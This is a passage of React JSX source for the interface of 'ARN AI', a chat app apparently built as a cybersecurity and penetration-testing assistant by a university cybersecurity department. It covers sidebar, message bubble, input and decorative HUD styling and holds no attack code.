            onClick={createNewChat}
            style={{
              width: '100%', padding: '10px 14px', borderRadius: 9,
              background: 'linear-gradient(135deg, rgba(99,102,241,0.15), rgba(139,92,246,0.1))',
              border: '1px solid rgba(99,102,241,0.4)',
              color: 'white', cursor: 'pointer',
              fontSize: 9, letterSpacing: 3, fontWeight: 700,
              display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 8,
              transition: 'all 0.25s cubic-bezier(0.16,1,0.3,1)',
              boxShadow: '0 0 16px rgba(99,102,241,0.15)',
            }}
            onMouseEnter={e => {
              e.currentTarget.style.boxShadow = '0 0 28px rgba(99,102,241,0.4)'
              e.currentTarget.style.borderColor = 'rgba(99,102,241,0.7)'
              e.currentTarget.style.transform = 'translateY(-1px)'
            }}
            onMouseLeave={e => {
              e.currentTarget.style.boxShadow = '0 0 16px rgba(99,102,241,0.15)'
              e.currentTarget.style.borderColor = 'rgba(99,102,241,0.4)'
              e.currentTarget.style.transform = 'translateY(0)'
            }}
          >
            <span style={{ fontSize: 12 }}>⚡</span>
            <span>YENİ SÖHBƏT</span>
          </button>
        </div>

        {/* Chat list */}
        <div style={{ flex: 1, overflowY: 'auto', padding: '8px 12px' }}>
          <div style={{
            fontSize: 8, letterSpacing: 3,
            color: 'rgba(129,140,248,0.4)', padding: '8px 8px 6px',
          }}>
            // session.history
          </div>
          {chats.map(chat => (
            <div
              key={chat.id}
              onClick={() => { setCurrentChatId(chat.id); setSidebarOpen(false) }}
              style={{
                padding: '10px 12px', borderRadius: 8, marginBottom: 4,
                cursor: 'pointer', display: 'flex', alignItems: 'center', justifyContent: 'space-between',
                background: chat.id === currentChatId ? 'rgba(99,102,241,0.12)' : 'transparent',
                border: `1px solid ${chat.id === currentChatId ? 'rgba(99,102,241,0.3)' : 'transparent'}`,
                transition: 'all 0.2s',
              }}
              onMouseEnter={e => {
                if (chat.id !== currentChatId) {
                  e.currentTarget.style.background = 'rgba(99,102,241,0.06)'
                }
              }}
              onMouseLeave={e => {
                if (chat.id !== currentChatId) {
                  e.currentTarget.style.background = 'transparent'
                }
              }}
            >
              <div style={{ flex: 1, minWidth: 0, display: 'flex', alignItems: 'center', gap: 8 }}>
                <span style={{ color: 'rgba(129,140,248,0.5)', fontSize: 10, flexShrink: 0 }}>▸</span>
                <span style={{
                  fontSize: 10, letterSpacing: 1,
                  color: chat.id === currentChatId ? '#a5b4fc' : 'rgba(148,163,184,0.6)',
                  overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap',
                }}>
                  {chat.title}
                </span>
              </div>
              {chats.length > 1 && (
                <button
                  onClick={e => { e.stopPropagation(); deleteChat(chat.id) }}
                  style={{
                    background: 'none', border: 'none', cursor: 'pointer',
                    color: 'rgba(148,163,184,0.3)', fontSize: 10, padding: '2px 4px',
                    borderRadius: 4, transition: 'all 0.2s', flexShrink: 0,
                  }}
                  onMouseEnter={e => { e.currentTarget.style.color = '#f87171'; e.currentTarget.style.background = 'rgba(248,113,113,0.1)' }}
                  onMouseLeave={e => { e.currentTarget.style.color = 'rgba(148,163,184,0.3)'; e.currentTarget.style.background = 'none' }}
                >✕</button>
              )}
            </div>
          ))}
        </div>

        {/* Sidebar footer */}
        <div style={{
          padding: '14px 20px', borderTop: '1px solid rgba(99,102,241,0.1)',
        }}>
          <div style={{
            display: 'flex', alignItems: 'center', gap: 6, marginBottom: 8,
          }}>
            <span style={{
              width: 5, height: 5, borderRadius: '50%',
              background: '#4ade80', boxShadow: '0 0 6px #4ade80',
              display: 'inline-block', animation: 'statusBlink 2s ease-in-out infinite',
            }} />
            <span style={{ fontSize: 8, letterSpacing: 2, color: 'rgba(99,102,241,0.5)' }}>
              CORE ACTIVE
            </span>
          </div>
          <div style={{ fontSize: 7, letterSpacing: 2, color: 'rgba(99,102,241,0.3)', lineHeight: 2 }}>
            <div>ARN.AI NEURAL ENGINE v6.0</div>
            <div>SESSIONS: {chats.length}</div>
          </div>
        </div>
      </div>

      {/* ══════════════════════════════════════════════════════════════════
          MAIN CHAT AREA
      ══════════════════════════════════════════════════════════════════ */}
      <div style={{
        flex: 1, display: 'flex', flexDirection: 'column',
        position: 'relative', zIndex: 2,
        height: '100%',
      }}>

        {/* ── Top Bar ─────────────────────────────────────────────────── */}
        <div style={{
          display: 'flex', alignItems: 'center', justifyContent: 'space-between',
          padding: '12px 20px',
          borderBottom: '1px solid rgba(99,102,241,0.1)',
          background: 'rgba(1,1,12,0.8)',
          backdropFilter: 'blur(20px)',
          position: 'relative', zIndex: 10,
        }}>
          {/* Top accent line */}
          <div style={{
            position: 'absolute', top: 0, left: 0, right: 0, height: 1,
            background: 'linear-gradient(90deg, transparent, rgba(99,102,241,0.3), transparent)',
            animation: 'borderPulse 3s ease-in-out infinite',
          }} />

          <div style={{ display: 'flex', alignItems: 'center', gap: 14 }}>
            {/* Sidebar toggle */}
            <button
              onClick={e => { e.stopPropagation(); setSidebarOpen(true) }}
              style={{
                background: 'rgba(99,102,241,0.08)', border: '1px solid rgba(99,102,241,0.25)',
                color: '#818cf8', width: 36, height: 36, borderRadius: 9,
                cursor: 'pointer', display: 'flex', alignItems: 'center', justifyContent: 'center',
                transition: 'all 0.25s',
              }}
              onMouseEnter={e => {
                e.currentTarget.style.background = 'rgba(99,102,241,0.15)'
                e.currentTarget.style.borderColor = 'rgba(99,102,241,0.5)'
                e.currentTarget.style.boxShadow = '0 0 16px rgba(99,102,241,0.3)'
              }}
              onMouseLeave={e => {
                e.currentTarget.style.background = 'rgba(99,102,241,0.08)'
                e.currentTarget.style.borderColor = 'rgba(99,102,241,0.25)'
                e.currentTarget.style.boxShadow = 'none'
              }}
            >
              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round">
                <line x1="3" y1="6" x2="21" y2="6" />
                <line x1="3" y1="12" x2="15" y2="12" />
                <line x1="3" y1="18" x2="18" y2="18" />
              </svg>
            </button>

            {/* Logo */}
            <div style={{ display: 'flex', alignItems: 'center', gap: 10 }}>
              <div style={{
                width: 32, height: 32, borderRadius: 9,
                background: 'linear-gradient(135deg, #6366f1, #9333ea)',
                display: 'flex', alignItems: 'center', justifyContent: 'center',
                boxShadow: '0 0 18px rgba(99,102,241,0.45)',
                animation: 'logoPulse 2.5s ease-in-out infinite',
              }}>
                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="white" strokeWidth="2.5" strokeLinecap="round">
                  <polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2" />
                </svg>
              </div>
              <div>
                <div style={{
                  fontSize: 13, fontWeight: 700, letterSpacing: 3,
                  background: 'linear-gradient(135deg, #818cf8, #c084fc)',
                  WebkitBackgroundClip: 'text', WebkitTextFillColor: 'transparent',
                }}>
                  ARN AI
                </div>
                <div style={{ fontSize: 7, letterSpacing: 3, color: 'rgba(129,140,248,0.4)', marginTop: 1 }}>
                  // neural.chat.interface
                </div>
              </div>
            </div>
          </div>

          {/* Right side: status + new chat */}
          <div style={{ display: 'flex', alignItems: 'center', gap: 12 }}>
            {/* Status badge */}
            <div style={{
              display: 'flex', alignItems: 'center', gap: 6,
              padding: '5px 12px', borderRadius: 20,
              background: 'rgba(99,102,241,0.06)',
              border: '1px solid rgba(99,102,241,0.15)',
            }}>
              <span style={{
                width: 5, height: 5, borderRadius: '50%',
                background: '#4ade80', boxShadow: '0 0 6px #4ade80',
                display: 'inline-block', animation: 'statusBlink 1.8s ease-in-out infinite',
              }} />
              <span style={{ fontSize: 7, letterSpacing: 2, color: 'rgba(129,140,248,0.6)' }}>
                ONLINE
              </span>
            </div>

            {/* New chat button */}
            <button
              onClick={e => { e.stopPropagation(); createNewChat() }}
              style={{
                background: 'linear-gradient(135deg, rgba(99,102,241,0.15), rgba(139,92,246,0.1))',
                border: '1px solid rgba(99,102,241,0.35)',
                color: '#a5b4fc', height: 36, borderRadius: 9,
                cursor: 'pointer', display: 'flex', alignItems: 'center', gap: 6,
                padding: '0 14px',
                fontSize: 9, letterSpacing: 2, fontWeight: 700,
                transition: 'all 0.25s cubic-bezier(0.16,1,0.3,1)',
              }}
              onMouseEnter={e => {
                e.currentTarget.style.boxShadow = '0 0 24px rgba(99,102,241,0.4)'
                e.currentTarget.style.borderColor = 'rgba(99,102,241,0.6)'
                e.currentTarget.style.transform = 'translateY(-1px)'
              }}
              onMouseLeave={e => {
                e.currentTarget.style.boxShadow = 'none'
                e.currentTarget.style.borderColor = 'rgba(99,102,241,0.35)'
                e.currentTarget.style.transform = 'translateY(0)'
              }}
            >
              <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round">
                <line x1="12" y1="5" x2="12" y2="19" />
                <line x1="5" y1="12" x2="19" y2="12" />
              </svg>
              <span>YENİ</span>
            </button>
          </div>
        </div>

        {/* ── Messages Area ───────────────────────────────────────────── */}
        <div style={{
          flex: 1, overflowY: 'auto', padding: '24px 20px',
          display: 'flex', flexDirection: 'column', gap: 16,
          position: 'relative',
        }}>

          {/* Empty state */}
          {!currentChat?.messages.length && (
            <div style={{
              display: 'flex', flexDirection: 'column', alignItems: 'center',
              justifyContent: 'center', height: '100%', textAlign: 'center', gap: 14,
              animation: 'fadeUp 0.8s cubic-bezier(0.16,1,0.3,1) both',
            }}>
              {/* Core icon with glow */}
              <div style={{
                width: 80, height: 80, borderRadius: 22,
                background: 'rgba(99,102,241,0.08)',
                border: '1px solid rgba(99,102,241,0.3)',
                display: 'flex', alignItems: 'center', justifyContent: 'center',
                animation: 'corePulse 2.5s ease-in-out infinite',
                marginBottom: 4, position: 'relative',
              }}>
                {/* Orbiting ring */}
                <div style={{
                  position: 'absolute', inset: -8, borderRadius: '50%',
                  border: '1px solid rgba(99,102,241,0.1)',
                  animation: 'glowRing 3s ease-in-out infinite',
                }} />
                <svg width="30" height="30" viewBox="0 0 24 24" fill="none" stroke="#818cf8" strokeWidth="2.5" strokeLinecap="round">
                  <polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2" />
                </svg>
              </div>

              <div>
                <div style={{
                  fontSize: 8, letterSpacing: 4,
                  color: 'rgba(129,140,248,0.45)', marginBottom: 8,
                }}>
                  // neural.core.active
                </div>
                <div style={{
                  fontSize: 28, fontWeight: 700,
                  background: 'linear-gradient(135deg, #818cf8, #c084fc)',
                  backgroundSize: '200% 100%',
                  WebkitBackgroundClip: 'text', WebkitTextFillColor: 'transparent',
                  letterSpacing: 4,
                  animation: 'shimmer 3s linear infinite',
                }}>
                  ARN AI
                </div>
                <div style={{
                  fontSize: 9, letterSpacing: 3,
                  color: 'rgba(148,163,184,0.4)', marginTop: 6,
                }}>
                  // kibertəhlükəsizlik_assistantı
                </div>
              </div>

              <p style={{
                maxWidth: 380, lineHeight: 1.8, marginTop: 4,
                fontSize: 10, letterSpacing: 1,
                color: 'rgba(148,163,184,0.5)',
              }}>
                Penetration testing, etik hacking və kibertəhlükəsizlik haqqında suallarınızı soruşun.
              </p>

              {/* Suggestion chips */}
              <div style={{
                display: 'grid', gridTemplateColumns: '1fr 1fr',
                gap: 8, marginTop: 12, width: '100%', maxWidth: 480,
              }}>
                {SUGGESTIONS.map(q => (
                  <button key={q} onClick={e => { e.stopPropagation(); setInput(q) }} style={{
                    padding: '12px 14px', borderRadius: 10, cursor: 'pointer',
                    background: 'rgba(4,4,22,0.85)',
                    border: '1px solid rgba(99,102,241,0.18)',
                    color: 'rgba(148,163,184,0.55)',
                    fontSize: 9, letterSpacing: 1, textAlign: 'left', lineHeight: 1.7,
                    transition: 'all 0.3s cubic-bezier(0.16,1,0.3,1)',
                    backdropFilter: 'blur(10px)',
                    position: 'relative', overflow: 'hidden',
                  }}
                    onMouseEnter={e => {
                      e.currentTarget.style.borderColor = 'rgba(99,102,241,0.5)'
                      e.currentTarget.style.color = '#a5b4fc'
                      e.currentTarget.style.background = 'rgba(99,102,241,0.08)'
                      e.currentTarget.style.transform = 'translateY(-2px)'
                      e.currentTarget.style.boxShadow = '0 0 20px rgba(99,102,241,0.15)'
                    }}
                    onMouseLeave={e => {
                      e.currentTarget.style.borderColor = 'rgba(99,102,241,0.18)'
                      e.currentTarget.style.color = 'rgba(148,163,184,0.55)'
                      e.currentTarget.style.background = 'rgba(4,4,22,0.85)'
                      e.currentTarget.style.transform = 'translateY(0)'
                      e.currentTarget.style.boxShadow = 'none'
                    }}
                  >
                    <span style={{ color: '#818cf8', marginRight: 6, opacity: 0.7 }}>▸</span>{q}
                  </button>
                ))}
              </div>

              {/* HUD info below suggestions */}
              <div style={{
                display: 'flex', gap: 24, marginTop: 20,
                fontSize: 7, letterSpacing: 2, color: 'rgba(99,102,241,0.3)',
              }}>
                <span>GROQ API</span>
                <span>·</span>
                <span>NEURAL ENGINE</span>
                <span>·</span>
                <span>v6.0</span>
              </div>
            </div>
          )}

          {/* Messages */}
          {currentChat?.messages.map((message, idx) => (
            <div key={message.id} className="msg-appear" style={{
              animationDelay: `${Math.min(idx * 0.03, 0.3)}s`,
              display: 'flex', gap: 10,
              justifyContent: message.role === 'user' ? 'flex-end' : 'flex-start',
              alignItems: 'flex-start',
              maxWidth: '100%',
            }}>

              {/* AI Avatar */}
              {message.role === 'assistant' && (
                <div style={{
                  width: 34, height: 34, borderRadius: 10, flexShrink: 0, marginTop: 2,
                  background: 'rgba(99,102,241,0.1)',
                  border: '1px solid rgba(99,102,241,0.35)',
                  display: 'flex', alignItems: 'center', justifyContent: 'center',
                  boxShadow: '0 0 14px rgba(99,102,241,0.2)',
                  position: 'relative',
                }}>
                  {/* Subtle rotating ring */}
                  {isLoading && idx === (currentChat?.messages.length || 0) - 1 && (
                    <div style={{
                      position: 'absolute', inset: -3, borderRadius: '50%',
                      border: '1px solid transparent',
                      borderTopColor: '#818cf8',
                      animation: 'spin 2s linear infinite',
                    }} />
                  )}
                  <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#818cf8" strokeWidth="2.5" strokeLinecap="round">
                    <polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2" />
                  </svg>
                </div>
              )}

              {/* Message bubble */}
              <div style={{
                maxWidth: message.role === 'user' ? '72%' : '82%',
                padding: message.role === 'user' ? '10px 16px' : '12px 16px',
                borderRadius: 14,
                position: 'relative', overflow: 'hidden',
                ...(message.role === 'user' ? {
                  background: 'linear-gradient(135deg, rgba(99,102,241,0.18), rgba(139,92,246,0.12))',
                  border: '1px solid rgba(99,102,241,0.3)',
                  borderBottomRightRadius: 4,
                  color: '#e2e8f0',
                  fontSize: '0.88rem', lineHeight: 1.65,
                  boxShadow: '0 0 20px rgba(99,102,241,0.08)',
                } : {
                  background: 'rgba(4,4,22,0.88)',
                  border: '1px solid rgba(99,102,241,0.15)',
                  borderBottomLeftRadius: 4,
                  backdropFilter: 'blur(20px)',
                  boxShadow: '0 0 25px rgba(99,102,241,0.06)',
                }),
              }}>
                {/* Top accent line on AI messages */}
                {message.role === 'assistant' && (
                  <div style={{
                    position: 'absolute', top: 0, left: 0, right: 0, height: 1,
                    background: 'linear-gradient(90deg, transparent, rgba(99,102,241,0.35), transparent)',
                  }} />
                )}

                {/* Bottom accent line on user messages */}
                {message.role === 'user' && (
                  <div style={{
                    position: 'absolute', bottom: 0, left: 0, right: 0, height: 1,
                    background: 'linear-gradient(90deg, transparent, rgba(139,92,246,0.3), transparent)',
                  }} />
                )}

                {message.role === 'assistant' ? (
                  message.content
                    ? <MarkdownMessage content={message.content} />
                    : <ThinkingDots />
                ) : (
                  message.content
                )}
              </div>

              {/* User Avatar */}
              {message.role === 'user' && (
                <div style={{
                  width: 34, height: 34, borderRadius: 10, flexShrink: 0, marginTop: 2,
                  background: 'linear-gradient(135deg, #6366f1, #9333ea)',
                  display: 'flex', alignItems: 'center', justifyContent: 'center',
                  fontWeight: 700, fontSize: 13,
                  color: 'white', boxShadow: '0 0 14px rgba(99,102,241,0.35)',
                  border: '1px solid rgba(255,255,255,0.15)',
                }}>
                  U
                </div>
              )}
            </div>
          ))}

          <div ref={messagesEndRef} />
        </div>

        {/* ── Input Area ──────────────────────────────────────────────── */}
        <div style={{
          padding: '12px 20px 18px',
          borderTop: '1px solid rgba(99,102,241,0.1)',
          background: 'rgba(1,1,12,0.9)',
          backdropFilter: 'blur(30px)',
          position: 'relative',
        }}>
          {/* Top scanline */}
          <div style={{
            position: 'absolute', top: 0, left: 0, right: 0, height: 1,
            background: 'linear-gradient(90deg, transparent, rgba(99,102,241,0.15), transparent)',
          }} />

          {/* Token bar */}
          <div style={{
            display: 'flex', alignItems: 'center', justifyContent: 'space-between',
            marginBottom: 10, padding: '0 2px',
          }}>
            <span style={{
              fontSize: 8, letterSpacing: 2,
              color: 'rgba(129,140,248,0.35)',
            }}>
              // messages: {tokenUsed}/{tokenLimit}
            </span>
            <div style={{
              display: 'flex', alignItems: 'center', gap: 8,
            }}>
              <div style={{
                width: 80, height: 2, borderRadius: 2,
                background: 'rgba(255,255,255,0.05)', overflow: 'hidden',
              }}>
                <div style={{
                  height: '100%', borderRadius: 2,
                  width: `${tokenPct}%`,
                  background: tokenPct > 80
                    ? 'linear-gradient(90deg, #f59e0b, #ef4444)'
                    : 'linear-gradient(90deg, #6366f1, #9333ea)',
                  transition: 'width 0.5s',
                  boxShadow: tokenPct > 80 ? '0 0 6px rgba(239,68,68,0.5)' : '0 0 6px rgba(99,102,241,0.5)',
                }} />
              </div>
              <span style={{
                fontSize: 7, letterSpacing: 2,
                color: tokenPct > 80 ? 'rgba(239,68,68,0.5)' : 'rgba(99,102,241,0.3)',
              }}>
                {Math.round(tokenPct)}%
              </span>
            </div>
          </div>

          {/* Input box */}
          <div style={{
            display: 'flex', gap: 10, alignItems: 'flex-end',
            padding: '10px 14px', borderRadius: 14,
            background: 'rgba(4,4,22,0.9)',
            border: '1px solid rgba(99,102,241,0.22)',
            transition: 'all 0.3s cubic-bezier(0.16,1,0.3,1)',
            position: 'relative', overflow: 'hidden',
            boxShadow: '0 0 20px rgba(99,102,241,0.05)',
          }}
            onFocusCapture={e => {
              e.currentTarget.style.borderColor = 'rgba(99,102,241,0.5)'
              e.currentTarget.style.boxShadow = '0 0 30px rgba(99,102,241,0.12), inset 0 0 30px rgba(99,102,241,0.03)'
            }}
            onBlurCapture={e => {
              e.currentTarget.style.borderColor = 'rgba(99,102,241,0.22)'
              e.currentTarget.style.boxShadow = '0 0 20px rgba(99,102,241,0.05)'
            }}
          >
            {/* Scan line animation */}
            <div style={{
              position: 'absolute', bottom: 0, left: 0, right: 0, height: 1,
              background: 'linear-gradient(90deg, transparent, rgba(99,102,241,0.25), transparent)',
              animation: 'scanH 3s linear infinite',
              pointerEvents: 'none',
            }} />

            {/* Corner decorations inside input */}
            <div style={{
              position: 'absolute', top: 5, left: 5, width: 6, height: 6,
              borderLeft: '1px solid rgba(99,102,241,0.2)',
              borderTop: '1px solid rgba(99,102,241,0.2)',
              pointerEvents: 'none',
            }} />
            <div style={{
              position: 'absolute', top: 5, right: 5, width: 6, height: 6,
              borderRight: '1px solid rgba(99,102,241,0.2)',
              borderTop: '1px solid rgba(99,102,241,0.2)',
              pointerEvents: 'none',
            }} />
            <div style={{
              position: 'absolute', bottom: 5, left: 5, width: 6, height: 6,
              borderLeft: '1px solid rgba(99,102,241,0.2)',
              borderBottom: '1px solid rgba(99,102,241,0.2)',
              pointerEvents: 'none',
            }} />
            <div style={{
              position: 'absolute', bottom: 5, right: 5, width: 6, height: 6,
              borderRight: '1px solid rgba(99,102,241,0.2)',
              borderBottom: '1px solid rgba(99,102,241,0.2)',
              pointerEvents: 'none',
            }} />

            <textarea
              ref={textareaRef}
              value={input}
              onChange={e => setInput(e.target.value)}
              onKeyDown={handleKeyDown}
              onClick={e => e.stopPropagation()}
              placeholder="// sualınızı yazın...  (Enter → göndər)"
              style={{
                flex: 1, background: 'transparent', border: 'none', outline: 'none',
                resize: 'none', color: '#e2e8f0',
                fontFamily: "'Space Mono', monospace", fontSize: '0.88rem',
                lineHeight: 1.6, minHeight: 22, maxHeight: 128,
                caretColor: '#818cf8',
              }}
              rows={1}
            />

            <button onClick={e => { e.stopPropagation(); handleSend() }}
              disabled={isLoading || !input.trim()}
              style={{
                flexShrink: 0, width: 38, height: 38, borderRadius: 10,
                display: 'flex', alignItems: 'center', justifyContent: 'center',
                cursor: isLoading || !input.trim() ? 'not-allowed' : 'pointer',
                transition: 'all 0.3s cubic-bezier(0.16,1,0.3,1)',
                border: 'none',
                position: 'relative',
                ...(isLoading || !input.trim() ? {
                  background: 'rgba(99,102,241,0.06)',
                  color: 'rgba(99,102,241,0.25)',
                } : {
                  background: 'linear-gradient(135deg, #6366f1, #9333ea)',
                  color: 'white',
                  boxShadow: '0 0 22px rgba(99,102,241,0.4)',
                }),
              }}
              onMouseEnter={e => {
                if (!isLoading && input.trim()) {
                  e.currentTarget.style.transform = 'translateY(-2px) scale(1.05)'
                  e.currentTarget.style.boxShadow = '0 0 35px rgba(99,102,241,0.6)'
                }
              }}
              onMouseLeave={e => {
                e.currentTarget.style.transform = 'translateY(0) scale(1)'
                e.currentTarget.style.boxShadow = isLoading || !input.trim() ? 'none' : '0 0 22px rgba(99,102,241,0.4)'
              }}
            >
              {isLoading ? (
                <svg style={{ animation: 'spin 1s linear infinite', width: 15, height: 15 }} viewBox="0 0 24 24" fill="none">
                  <circle cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="3" strokeDasharray="31.4" strokeDashoffset="10" strokeLinecap="round" />
                </svg>
              ) : (
                <svg width="15" height="15" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2.5} d="M13 10V3L4 14h7v7l9-11h-7z" />
                </svg>
              )}
            </button>
          </div>

          {/* Footer */}
          <div style={{
            display: 'flex', alignItems: 'center', justifyContent: 'center',
            gap: 16, marginTop: 8,
            fontSize: 7, letterSpacing: 2,
            color: 'rgba(148,163,184,0.18)',
          }}>
            <span>AZTU</span>
            <span style={{ color: 'rgba(99,102,241,0.2)' }}>·</span>
            <span>CYBERSEC DEPT</span>
            <span style={{ color: 'rgba(99,102,241,0.2)' }}>·</span>
            <span>REDBOARD v1.0</span>
          </div>
        </div>
      </div>

      {/* ══════════════════════════════════════════════════════════════════
          HUD OVERLAYS
      ══════════════════════════════════════════════════════════════════ */}

      {/* Bottom-left HUD */}
      <div style={{
        position: 'fixed', bottom: 12, left: 12, zIndex: 3,
        fontSize: 7, letterSpacing: 2, color: 'rgba(99,102,241,0.2)',
        lineHeight: 2, pointerEvents: 'none',
      }}>
        <div>NEURAL.CORE ▸ ONLINE</div>
        <div>LATENCY ▸ &lt;12ms</div>
      </div>

      {/* Bottom-right HUD */}
      <div style={{
        position: 'fixed', bottom: 12, right: 12, zIndex: 3,
        fontSize: 7, letterSpacing: 2, color: 'rgba(99,102,241,0.2)',
        lineHeight: 2, textAlign: 'right', pointerEvents: 'none',
      }}>
        <div>UPTIME ▸ 99.97%</div>
        <div style={{ display: 'flex', alignItems: 'center', gap: 4, justifyContent: 'flex-end' }}>
          <span style={{
            width: 4, height: 4, borderRadius: '50%',
            background: '#4ade80', boxShadow: '0 0 4px #4ade80', display: 'inline-block',
            animation: 'statusBlink 2s ease-in-out infinite',
          }} />
          CORE ACTIVE
        </div>
      </div>
    </div>
  )
}
